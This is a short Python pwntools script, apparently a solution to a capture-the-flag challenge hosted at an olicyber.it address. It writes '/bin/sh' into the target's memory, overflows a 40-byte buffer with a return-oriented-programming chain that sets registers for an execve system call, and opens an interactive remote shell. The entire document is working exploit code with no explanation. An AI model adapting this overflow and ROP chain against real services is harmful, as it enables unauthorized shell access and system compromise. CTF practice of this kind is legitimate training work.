#!/usr/bin/env python3
from pwn import *

r = remote("emergency.challs.olicyber.it", 10306)
r.recv(1000)
r.send(b'/bin/sh\x00')

payload = b'a'*40 # buffer

payload += p64(0x401032) # rop : pop rdi
payload += p64(59)

payload += p64(0x401038) # rop : xor rax

payload += p64(0x401032) # rop : pop rdi
payload += p64(0x404000)

payload += p64(0x401034) # rop : pop rsi
payload += p64(0)

payload += p64(0x401036) # rop : pop rdx
payload += p64(0)

payload += p64(0x40102f) # syscall

r.recv(1000)
r.send(payload + b'\x00')
r.interactive()
